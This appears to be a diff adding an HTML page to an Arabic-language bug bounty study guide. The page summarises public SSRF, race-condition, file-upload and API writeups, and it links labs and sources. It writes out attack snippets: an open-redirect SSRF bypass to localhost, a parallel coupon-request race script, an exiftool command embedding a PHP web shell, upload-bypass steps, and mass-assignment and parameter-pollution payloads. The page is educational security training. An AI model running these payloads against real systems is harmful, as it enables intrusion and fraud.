+    <div class="wlogo" style="background:rgba(29,161,242,.1);color:#79c0ff;">X<br>SSRF</div>
+    <div class="wmeta">
+      <div class="wtitle">SSRF in cards-dev.twitter.com/validator</div>
+      <div class="wsub"><span class="badge by">HIGH</span><span class="badge bd">16 upvotes · HackerOne Top SSRF List</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الموقع</div>
+      <div class="blk-txt">Twitter Cards validator كان يجلب URL المُمرَّر له لمعاينة الـ Card. تمرير URL داخلي أدى لـ SSRF. هذا النوع شائع جداً في <strong>Preview/Fetch features</strong>.</div>
+    </div>
+  </div>
+</div>
+
+<!-- Google Cloud SSRF $31k -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(66,133,244,.1);color:#79c0ff;">GOOG<br>SSRF</div>
+    <div class="wmeta">
+      <div class="wtitle">Google Cloud Blind SSRF → $31,337 (Explained by Bug Bounty Reports)</div>
+      <div class="wsub"><span class="badge bc">💰 $31,337</span><span class="badge br">CRITICAL</span><span class="badge bd">Google VRP — awesome-google-vrp</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">لماذا $31,337 وليس $30,000</div>
+      <div class="blk-txt">
+        الرقم 31337 يُقرأ "l33t" في leet speak — Google تعطيه لـ "Elite" vulnerabilities. Blind SSRF في Google Cloud أتاح الوصول لـ internal metadata وـ private services.
+      </div>
+      <div class="note nb">💡 Google لديها SSRF Hall of Fame. الـ writeups على GitHub xdavidhu تحتوي على شرح كامل لكل bug بالفيديو.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">المصادر</div>
+      <a href="https://github.com/xdavidhu/awesome-google-vrp-writeups" target="_blank" class="lnk">📋 Awesome Google VRP Writeups — GitHub <span class="lnk-badge">ESSENTIAL</span></a>
+      <a href="https://corneacristian.medium.com/top-25-server-side-request-forgery-ssrf-bug-bounty-reports-136928356eca" target="_blank" class="lnk">📝 Top 25 SSRF Reports — Medium</a>
+    </div>
+  </div>
+</div>
+
+<!-- Airbnb SSRF via open redirect -->
+<div class="wcard" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(255,90,90,.1);color:#ff7b72;">AIR<br>SSRF</div>
+    <div class="wmeta">
+      <div class="wtitle">Airbnb — Chaining Open Redirect into SSRF via LivePerson Chat</div>
+      <div class="wsub"><span class="badge br">CRITICAL</span><span class="badge bd">buer.haus — Awesome Bug Bounty Writeups</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الـ Chain</div>
+      <div class="blk-txt">
+        Open Redirect في third-party chat widget (LivePerson) استُخدم كـ SSRF bypass. الـ server الخاص بـ Airbnb كان يتبع الـ redirect — فوصل لـ internal network.
+      </div>
+      <div class="code">
+<span class="c"># SSRF مباشر → مرفوض (blacklist)</span>
+<span class="d">url=http://127.0.0.1/admin</span>
+
+<span class="c"># SSRF عبر Open Redirect → قُبل!</span>
+<span class="v">url=https://liveperson.com/redirect?to=http://127.0.0.1/admin</span>
+<span class="c">← الـ blacklist يمنع 127.0.0.1 لكن يسمح بـ liveperson.com</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="blk" style="background:var(--s2);border:1px solid var(--b);border-radius:8px;margin-bottom:10px;">
+  <div class="blk-title bt-g" style="margin-bottom:10px;">🧪 Labs SSRF — PortSwigger</div>
+  <a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost" target="_blank" class="lab">🧪 Basic SSRF against localhost <span class="lab-d la">Apprentice</span></a>
+  <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter" target="_blank" class="lab">🧪 SSRF with blacklist filter bypass <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection" target="_blank" class="lab">🧪 SSRF bypass via open redirect <span class="lab-d lp">Practitioner</span></a>
+  <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter" target="_blank" class="lab">🧪 SSRF with whitelist filter <span class="lab-d lp">Practitioner</span></a>
+</div>
+
+<div class="links">
+  <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPSSRF.md" target="_blank" class="lnk">📋 Top SSRF Reports — GitHub (100+ reports)</a>
+  <a href="https://corneacristian.medium.com/top-25-server-side-request-forgery-ssrf-bug-bounty-reports-136928356eca" target="_blank" class="lnk">📝 Top 25 SSRF Reports — Medium</a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     RACE CONDITIONS
+════════════════════════════════════════════════════ -->
+<div id="p-race" class="panel">
+<div class="sh">
+  <div class="sh-icon">⏱</div>
+  <div><div class="sh-title">Race Conditions</div><div class="sh-sub">Airbnb — GitHub Actions — Medium</div></div>
+</div>
+
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(255,255,255,.05);color:#c9d1d9;">GIT<br>RACE</div>
+    <div class="wmeta">
+      <div class="wtitle">ArtiPACKED: Hacking Giants via Race Condition in GitHub Actions Artifacts</div>
+      <div class="wsub"><span class="badge by">HIGH</span><span class="badge bd">Yaron Avital — Google VRP Writeups 2024</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">ثغرة 2024 الحقيقية</div>
+      <div class="blk-txt">
+        Race Condition في GitHub Actions artifacts upload — الـ artifact يكون متاحاً للـ download لفترة قصيرة أثناء الـ upload قبل تطبيق الصلاحيات. هذا سمح بسرقة secrets من repositories خاصة.
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">كيف تختبر Race Conditions من الموبايل</div>
+      <div class="code">
+<span class="c">// في DevTools Console — Race Condition test</span>
+<span class="k">const</span> <span class="v">requests = [];</span>
+<span class="k">for</span>(<span class="v">let i = 0; i &lt; 20; i++</span>) {
+  requests.push(
+    <span class="k">fetch</span>(<span class="d">'/api/coupon/apply'</span>, {
+      method: <span class="v">'POST'</span>,
+      headers: {<span class="v">'Content-Type': 'application/json'</span>},
+      body: JSON.stringify({<span class="v">code: 'SAVE50'</span>})
+    })
+  );
+}
+<span class="k">Promise.all</span>(requests)
+  .then(r => <span class="v">console.log('All done:', r.length)</span>);
+      </div>
+      <div class="note ng">✅ ابحث عن الدليل في الـ account: كم مرة طُبِّق الكوبون؟ كم الرصيد الحالي؟</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">Labs + مصادر</div>
+      <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun" target="_blank" class="lab">🧪 Limit Overrun Race Condition <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits" target="_blank" class="lab">🧪 Bypassing Rate Limits <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPRACECONDITION.md" target="_blank" class="lnk">📋 Top Race Condition Reports — GitHub</a>
+      <a href="https://medium.com/@vincenz/exploiting-a-race-condition-vulnerability-3f2cb387a72" target="_blank" class="lnk">📝 Exploiting Race Condition — Medium</a>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     FILE UPLOAD
+════════════════════════════════════════════════════ -->
+<div id="p-upload" class="panel">
+<div class="sh">
+  <div class="sh-icon">📁</div>
+  <div><div class="sh-title">File Upload Vulnerabilities</div><div class="sh-sub">PNG PHP Injection · Polyglot · Extension Bypass</div></div>
+</div>
+
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(227,179,65,.1);color:#e3b341;">PHP<br>PNG</div>
+    <div class="wmeta">
+      <div class="wtitle">Persistent PHP Payloads in PNGs: Inject PHP Code in an Image</div>
+      <div class="wsub"><span class="badge by">HIGH</span><span class="badge bd">Bug Bounty Writeups — insecrez GitHub</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">الـ Polyglot Attack</div>
+      <div class="blk-txt">
+        ملف PNG صالح ومقبول كصورة، لكن يحتوي PHP code مخفي في الـ metadata. إذا خُزِّن الملف في مكان يمكن تنفيذه، تُنفَّذ الـ PHP.
+      </div>
+      <div class="code">
+<span class="c"># إضافة PHP code في EXIF metadata</span>
+<span class="k">exiftool</span> -Comment=<span class="d">"&lt;?php system(\$_GET['cmd']); ?&gt;"</span> image.jpg
+<span class="c"># ثم إعادة تسميته لـ image.php أو image.jpg.php</span>
+<span class="c"># الصورة تبدو طبيعية لكن تُنفَّذ كـ PHP!</span>
+      </div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">اختبار File Upload من الموبایل</div>
+      <ol class="steps">
+        <li>ارفع صورة JPG عادية وسجّل الـ request في Tamper Dev</li>
+        <li>غيّر filename لـ shell.php وأبقِ Content-Type: image/jpeg</li>
+        <li>محتوى الملف: <code>&lt;?php echo "TEST"; ?&gt;</code></li>
+        <li>إذا قُبل، ابحث عن URL الملف في الـ response</li>
+        <li>افتح الـ URL — هل ظهر "TEST"؟ → RCE!</li>
+        <li>جرّب extensions أخرى: .php5, .phtml, .phar, .PHP</li>
+      </ol>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">Labs + مصادر</div>
+      <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank" class="lab">🧪 Web shell via Content-Type bypass <span class="lab-d la">Apprentice</span></a>
+      <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank" class="lab">🧪 Web shell via path traversal <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension" target="_blank" class="lab">🧪 Obfuscated extension bypass <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPUPLOAD.md" target="_blank" class="lnk">📋 Top File Upload Reports — GitHub</a>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     API
+════════════════════════════════════════════════════ -->
+<div id="p-api" class="panel">
+<div class="sh">
+  <div class="sh-icon">🔌</div>
+  <div><div class="sh-title">API Security / BOLA / Mass Assignment</div><div class="sh-sub">Uber · Twitter · GitHub · TikTok GraphQL</div></div>
+</div>
+
+<div class="wcard op" onclick="tog(this)">
+  <div class="wcard-h">
+    <div class="wlogo" style="background:rgba(248,81,73,.1);color:#ff7b72;">UBER<br>API</div>
+    <div class="wmeta">
+      <div class="wtitle">Sensitive User Info at bonjour.uber.com via 'userUuid' parameter — BOLA</div>
+      <div class="wsub"><span class="badge bc">💰 $6,500</span><span class="badge br">CRITICAL</span><span class="badge bd">600 upvotes — Most upvoted Uber report!</span></div>
+    </div>
+    <div class="warr">▼</div>
+  </div>
+  <div class="wbody">
+    <div class="blk">
+      <div class="blk-title bt-y">التفاصيل</div>
+      <div class="blk-txt">
+        الـ endpoint <code>/marketplace/_rpc</code> على <code>bonjour.uber.com</code> كان يُرجع معلومات حساسة جداً (PII) لأي مستخدم عبر تمرير <code>userUuid</code> فقط. الـ UUIDs كانت قابلة للحصول عليها من مصادر أخرى.
+      </div>
+      <div class="note ny">⚡ هذا التقرير حصل على 600 upvote — الأكثر تصويتاً في برنامج Uber. Simple IDOR = $6,500.</div>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-r">اكتشاف API Endpoints من الموبايل</div>
+      <ol class="steps">
+        <li>DevTools → Network → فلتر لـ XHR/Fetch فقط</li>
+        <li>استخدم التطبيق بشكل طبيعي وراقب كل الـ requests</li>
+        <li>في Sources، ابحث عن الـ JS files الرئيسية</li>
+        <li>في DevTools Console: <code>fetch('/api/docs').then(r=>r.json()).then(console.log)</code></li>
+        <li>جرّب: /swagger.json, /openapi.yaml, /api/docs, /api/v1</li>
+        <li>كل endpoint + كل ID = فرصة BOLA</li>
+      </ol>
+    </div>
+    <div class="blk">
+      <div class="blk-title bt-b">Labs + مصادر</div>
+      <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation" target="_blank" class="lab">🧪 Exploiting API via documentation <span class="lab-d la">Apprentice</span></a>
+      <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability" target="_blank" class="lab">🧪 Mass Assignment <span class="lab-d lp">Practitioner</span></a>
+      <a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPRESTAPI.md" target="_blank" class="lnk">📋 Top REST API Reports — GitHub</a>
+      <a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" target="_blank" class="lnk">🔴 OWASP API Security Top 10 — 2023</a>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     TRICKS
+════════════════════════════════════════════════════ -->
+<div id="p-tricks" class="panel">
+<div class="sh">
+  <div class="sh-icon">🎩</div>
+  <div><div class="sh-title">Tricks & Advanced Techniques</div><div class="sh-sub">Chaining · WAF Bypass · Smart Hunting Tips</div></div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">🔗 Vulnerability Chaining — الـ Trick الأقوى</div>
+  <div class="trick-body">
+    ثغرة واحدة P4 = $50. نفس الثغرة مع chain = $5,000+.<br><br>
+    <strong>أمثلة ناجحة:</strong><br>
+    • Self-XSS + Login CSRF = ATO ($62,500 في Facebook)<br>
+    • Open Redirect + SSRF = Internal Access<br>
+    • IDOR + PII = Critical بدل Low<br>
+    • XSS + CSRF = Account Takeover<br>
+    • Race Condition + Business Logic = Unlimited Money<br><br>
+    <strong>كيف تفكر في الـ Chain:</strong> بعد كل bug تجده اسأل: "ماذا لو دمجت هذا مع X؟"
+  </div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">🔍 ابحث في Subdomains — 90% من الـ Bugs هناك</div>
+  <div class="trick-body">
+    الـ main domain محمي ومُختبَر كثيراً. الـ subdomains غالباً مهملة.<br><br>
+    <strong>ابحث عن:</strong> dev., stage., beta., api., m., shop., partners., developer., internal.<br><br>
+    <strong>من الموبايل:</strong> crt.sh/?q=*.target.com لرؤية كل الـ subdomains في certificate transparency logs.
+  </div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">📂 JavaScript Files — كنز مخفي</div>
+  <div class="trick-body">
+    JavaScript files تحتوي على:<br>
+    • API endpoints مخفية<br>
+    • Access tokens أو API keys<br>
+    • Comments تكشف logic داخلي<br>
+    • Environment variables<br><br>
+    <strong>من الموبايل:</strong> DevTools → Sources → ابحث عن .js files الكبيرة → Ctrl+F للبحث عن: api, endpoint, token, key, secret, password.
+  </div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">🔄 HTTP Method Tampering</div>
+  <div class="trick-body">
+    الـ endpoint يرفض GET لكن يقبل POST؟ أو العكس؟<br><br>
+    <div class="code">
+<span class="c"># جرّب كل method على كل endpoint</span>
+<span class="k">GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD</span>
+<span class="c"># وأيضاً headers:</span>
+<span class="v">X-HTTP-Method-Override: DELETE</span>
+<span class="v">X-Method-Override: PUT</span>
+    </div>
+  </div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">📋 Parameter Pollution</div>
+  <div class="trick-body">
+    إرسال نفس الـ parameter أكثر من مرة يُربك الـ server.<br>
+    <div class="code">
+<span class="c"># أيهما يأخذ الـ server؟</span>
+<span class="d">POST /transfer?amount=100&amount=0.01</span>
+<span class="c"># بعض الـ frameworks تأخذ الأول، بعضها الأخير</span>
+
+<span class="c"># في JSON</span>
+<span class="d">{"role":"user","role":"admin"}</span>
+    </div>
+  </div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">🕵️ Wayback Machine للـ Old Endpoints</div>
+  <div class="trick-body">
+    <strong>web.archive.org</strong> يحتفظ بنسخ قديمة من الموقع تحتوي على endpoints محذوفة قد تكون لا تزال تعمل!<br><br>
+    من الموبايل: web.archive.org/web/*/target.com/api/* لرؤية كل الـ API endpoints القديمة.
+  </div>
+</div>
+
+<div class="trick">
+  <div class="trick-title">🔢 Mass Assignment Attack</div>
+  <div class="trick-body">
+    عند PUT/POST لتحديث بيانات، جرّب إضافة fields غير متوقعة:<br>
+    <div class="code">
+<span class="c"># طبيعي</span>
+<span class="v">{"name": "John", "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="365c595e58764e1855595b">[email&#160;protected]</a>"}</span>
+
+<span class="c"># Mass Assignment</span>
+<span class="d">{"name": "John", "email": "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f993969197b981d79a9694">[email&#160;protected]</a>",
+ "role": "admin",
+ "isVerified": true,
+ "credits": 99999,
+ "isAdmin": true,
+ "subscription": "premium"}</span>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     SOURCES
+════════════════════════════════════════════════════ -->
+<div id="p-sources" class="panel">
+<div class="sh">
+  <div class="sh-icon">📚</div>
+  <div><div class="sh-title">كل المصادر الموثوقة</div><div class="sh-sub">GitHub · HackerOne · Bugcrowd · Medium · Specialized Sites</div></div>
+</div>
+
+<div class="plat-divider">📋 GITHUB — أفضل المصادر</div>
+<div class="src-grid">
+  <a href="https://github.com/reddelexc/hackerone-reports" target="_blank" class="src-item">
+    <div class="src-icon">📋</div>
+    <div class="src-meta">
+      <span class="src-name">reddelexc/hackerone-reports</span>
+      <span class="src-desc">أضخم collection لـ HackerOne reports مصنّفة حسب نوع الثغرة والشركة</span>
+    </div>
+    <span class="src-tag">ESSENTIAL ⭐</span>
+  </a>
+  <a href="https://github.com/devanshbatham/Awesome-Bugbounty-Writeups" target="_blank" class="src-item">
+    <div class="src-icon">📋</div>
+    <div class="src-meta">
+      <span class="src-name">Awesome Bug Bounty Writeups</span>
+      <span class="src-desc">Writeups مصنّفة حسب نوع الثغرة — XSS, SSRF, RCE, IDOR وغيرها</span>
+    </div>
+    <span class="src-tag">ESSENTIAL ⭐</span>
+  </a>
+  <a href="https://github.com/ngalongc/bug-bounty-reference" target="_blank" class="src-item">
+    <div class="src-icon">📋</div>
+    <div class="src-meta">
+      <span class="src-name">ngalongc/bug-bounty-reference</span>
+      <span class="src-desc">الـ original reference — Uber, PayPal, Facebook, GitHub writeups</span>
+    </div>
+    <span class="src-tag">CLASSIC</span>
+  </a>
+  <a href="https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups" target="_blank" class="src-item">
+    <div class="src-icon">📘</div>
+    <div class="src-meta">
+      <span class="src-name">Facebook Bug Bounty Writeups</span>
+      <span class="src-desc">كل writeups برنامج Facebook/Meta مصنّفة بالتاريخ والمبلغ</span>
+    </div>
+    <span class="src-tag">META-ONLY</span>
+  </a>
+  <a href="https://github.com/xdavidhu/awesome-google-vrp-writeups" target="_blank" class="src-item">
+    <div class="src-icon">📗</div>
+    <div class="src-meta">
+      <span class="src-name">Awesome Google VRP Writeups</span>
+      <span class="src-desc">كل writeups برنامج Google مع الروابط والمبالغ والباحثين</span>
+    </div>
+    <span class="src-tag">GOOGLE-ONLY</span>
+  </a>
+  <a href="https://github.com/fardeen-ahmed/Bug-bounty-Writeups" target="_blank" class="src-item">
+    <div class="src-icon">📋</div>
+    <div class="src-meta">
+      <span class="src-name">fardeen-ahmed/Bug-bounty-Writeups</span>
+      <span class="src-desc">Collection شاملة تغطي writeups من 2019 لحتى الآن</span>
+    </div>
+    <span class="src-tag">GENERAL</span>
+  </a>
+  <a href="https://github.com/kh4sh3i/bug-bounty-writeups" target="_blank" class="src-item">
+    <div class="src-icon">📋</div>
+    <div class="src-meta">
+      <span class="src-name">kh4sh3i/bug-bounty-writeups</span>
+      <span class="src-desc">Writeups + disclosure programs — مصنّفة ومحدّثة</span>
+    </div>
+    <span class="src-tag">UPDATED</span>
+  </a>
+</div>
+
+<div class="plat-divider">🌐 SPECIALIZED SITES</div>
+<div class="src-grid">
+  <a href="https://pentester.land/writeups/" target="_blank" class="src-item">
+    <div class="src-icon">🌍</div>
+    <div class="src-meta">
+      <span class="src-name">Pentester.land Writeups</span>
+      <span class="src-desc">أضخم directory لـ bug bounty writeups — قابل للبحث والفلترة حسب نوع الثغرة</span>
+    </div>
+    <span class="src-tag">SEARCHABLE ⭐</span>
+  </a>
+  <a href="https://writeups.io/" target="_blank" class="src-item">
+    <div class="src-icon">📝</div>
+    <div class="src-meta">
+      <span class="src-name">writeups.io</span>
+      <span class="src-desc">Crowdsourced writeups — Zoom, SharePoint, ServiceNow وغيرها — 2024/2025</span>
+    </div>
+    <span class="src-tag">LATEST 2025</span>
+  </a>
+  <a href="https://www.bugbountyhunter.com/disclosed/" target="_blank" class="src-item">
+    <div class="src-icon">🎯</div>
+    <div class="src-meta">
+      <span class="src-name">BugBountyHunter — Disclosed</span>
+      <span class="src-desc">ZSeano's platform — guides + real writeups + methodology</span>
+    </div>
+    <span class="src-tag">METHODOLOGY ⭐</span>
+  </a>
+  <a href="https://www.intigriti.com/researchers/hackademy" target="_blank" class="src-item">
+    <div class="src-icon">🏆</div>
+    <div class="src-meta">
+      <span class="src-name">Intigriti Hackademy</span>
+      <span class="src-desc">دروس + writeups + challenges مجانية</span>
+    </div>
+    <span class="src-tag">LEARNING</span>
+  </a>
+  <a href="https://www.yeswehack.com/learn-bug-bounty" target="_blank" class="src-item">
+    <div class="src-icon">📚</div>
+    <div class="src-meta">
+      <span class="src-name">YesWeHack Bug Bounty Guides</span>
+      <span class="src-desc">Guides محدّثة 2024/2025 لكل نوع ثغرة</span>
+    </div>
+    <span class="src-tag">GUIDES</span>
+  </a>
+</div>
+
+<div class="plat-divider">💰 OFFICIAL PLATFORMS</div>
+<div class="src-grid">
+  <a href="https://hackerone.com/hacktivity" target="_blank" class="src-item">
+    <div class="src-icon">💰</div>
+    <div class="src-meta">
+      <span class="src-name">HackerOne Hacktivity</span>
+      <span class="src-desc">آخر التقارير المُكشَف عنها — real-time</span>
+    </div>
+    <span class="src-tag">OFFICIAL</span>
+  </a>
+  <a href="https://portswigger.net/web-security/all-labs" target="_blank" class="src-item">
+    <div class="src-icon">🟢</div>
+    <div class="src-meta">
+      <span class="src-name">PortSwigger Web Security Academy</span>
+      <span class="src-desc">أفضل Labs للتدريب العملي — مجانية 100%</span>
+    </div>
+    <span class="src-tag">TRAINING ⭐</span>
+  </a>
+  <a href="https://owasp.org/www-project-top-ten/" target="_blank" class="src-item">
+    <div class="src-icon">🔴</div>
+    <div class="src-meta">
+      <span class="src-name">OWASP Top 10</span>
+      <span class="src-desc">المرجع الرسمي لأكثر الثغرات شيوعاً</span>
+    </div>
+    <span class="src-tag">REFERENCE</span>
+  </a>
+  <a href="https://owasp.org/API-Security/editions/2023/en/0x00-header/" target="_blank" class="src-item">
+    <div class="src-icon">🔴</div>
+    <div class="src-meta">
+      <span class="src-name">OWASP API Security Top 10 — 2023</span>
+      <span class="src-desc">المرجع الأساسي لأمان الـ APIs</span>
+    </div>
+    <span class="src-tag">API REF</span>
+  </a>
+</div>
+
+<div class="plat-divider">📱 SOCIAL & COMMUNITY</div>
+<div class="src-grid">
+  <a href="https://twitter.com/search?q=%23bugbounty+writeup&f=live" target="_blank" class="src-item">
+    <div class="src-icon">🐦</div>
+    <div class="src-meta">
+      <span class="src-name">Twitter/X — #bugbounty writeup</span>
+      <span class="src-desc">أسرع مكان لرؤية writeups جديدة — باحثون يشاركون فور النشر</span>
+    </div>
+    <span class="src-tag">REALTIME</span>
+  </a>
+  <a href="https://t.me/bugbountywriteup" target="_blank" class="src-item">
+    <div class="src-icon">✈️</div>
+    <div class="src-meta">
+      <span class="src-name">Telegram — Bug Bounty Writeup</span>
+      <span class="src-desc">Channel يشارك writeups يومياً</span>
+    </div>
+    <span class="src-tag">DAILY</span>
+  </a>
+  <a href="https://medium.com/tag/bug-bounty" target="_blank" class="src-item">
+    <div class="src-icon">📝</div>
+    <div class="src-meta">
+      <span class="src-name">Medium — Bug Bounty Tag</span>
+      <span class="src-desc">آلاف الـ writeups من باحثين مختلفين</span>
+    </div>
+    <span class="src-tag">ARTICLES</span>
+  </a>
+</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════
+     ROADMAP
+════════════════════════════════════════════════════ -->
+<div id="p-roadmap" class="panel">
+<div class="sh">
+  <div class="sh-icon">🗺</div>
+  <div><div class="sh-title">خارطة طريقك الآن</div><div class="sh-sub">من مستواك الحالي للمكافأة الأولى</div></div>
+</div>
+
+<div style="background:var(--s2);border:1px solid var(--b);border-radius:8px;padding:14px;margin-bottom:14px;">
+  <div class="blk-title bt-g" style="margin-bottom:10px;">📊 مستواك الحالي</div>
+  <div class="prog-bar-wrap">
+    <div class="prog-label"><span>Access Control / IDOR</span><span style="color:var(--grn)">85%</span></div>
+    <div class="prog-bar"><div class="prog-fill" style="width:85%;background:linear-gradient(90deg,var(--grn),#38f9d7)"></div></div>
+  </div>
+  <div class="prog-bar-wrap">
+    <div class="prog-label"><span>Authentication</span><span style="color:var(--org)">60%</span></div>
+    <div class="prog-bar"><div class="prog-fill" style="width:60%;background:linear-gradient(90deg,var(--org),#fc4)"></div></div>
+  </div>
+  <div class="prog-bar-wrap">
+    <div class="prog-label"><span>Business Logic</span><span style="color:var(--org)">50%</span></div>
+    <div class="prog-bar"><div class="prog-fill" style="width:50%;background:linear-gradient(90deg,var(--org),#fc4)"></div></div>
+  </div>
+  <div class="prog-bar-wrap">
+    <div class="prog-label"><span>XSS / CSRF / SSRF</span><span style="color:var(--red)">10%</span></div>
+    <div class="prog-bar"><div class="prog-fill" style="width:10%;background:linear-gradient(90deg,var(--red),#f96)"></div></div>
+  </div>
+  <div class="prog-bar-wrap">
+    <div class="prog-label"><span>API / Race / Upload</span><span style="color:var(--red)">5%</span></div>
+    <div class="prog-bar"><div class="prog-fill" style="width:5%;background:linear-gradient(90deg,var(--red),#f96)"></div></div>
+  </div>
+</div>
+
+<div class="tl">
+  <div class="tl-item">
+    <div class="tl-month">الآن — الأسبوع 1</div>
+    <div class="tl-txt"><strong>أكمل Business Logic Labs</strong> التي بدأتها. اقرأ 5 writeups من GitHub reddelexc TOPBUSINESSLOGIC. افهم لماذا الثغرة موجودة — مش بس كيف تُستغل.</div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-month">الأسبوع 2-3</div>
+    <div class="tl-txt"><strong>XSS كاملة:</strong> Reflected → Stored → DOM بالترتيب. لكل lab، اقرأ الـ writeup المقابل من قائمة TOPXSS. ابدأ بـ Telegram Blind XSS writeup — الأقرب لمستواك.</div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-month">الأسبوع 4</div>
+    <div class="tl-txt"><strong>CSRF:</strong> 4 labs + اقرأ ZSeano's CSRF Guide على BugBountyHunter. الـ methodology هناك تستحق أكثر من الـ labs نفسها.</div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-month">الشهر 2 — الأول</div>
+    <div class="tl-txt"><strong>SSRF:</strong> ابدأ بـ GitLab writeup. استخدم webhook.site مع كل lab. <strong>API Security:</strong> اقرأ OWASP API Top 10 كاملاً — ساعتان بس.</div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-month">الشهر 2 — الثاني</div>
+    <div class="tl-txt"><strong>الأهم:</strong> اختر برنامج VDP واحد من HackerOne. ابحث عن IDOR وـ Business Logic فقط — قوتك الحالية. اقرأ writeups الـ program على Pentester.land قبل البدء.</div>
+  </div>
+  <div class="tl-item">
+    <div class="tl-month">الشهر 3+ — أول مكافأة</div>
+    <div class="tl-txt"><strong>الهدف الواقعي:</strong> P3 أو P4 في برنامج متوسط = $50-500. ده مش نهاية — ده البداية الحقيقية. <strong>أرسل تقارير حتى لو N/A</strong> — كل رد يعلّمك.</div>
+  </div>
+</div>
+</div>
+
+
+</div>
+
+</div><!-- end content-wrap -->
+
+
+<script src="app.js"></script>
+</body>
+</html>
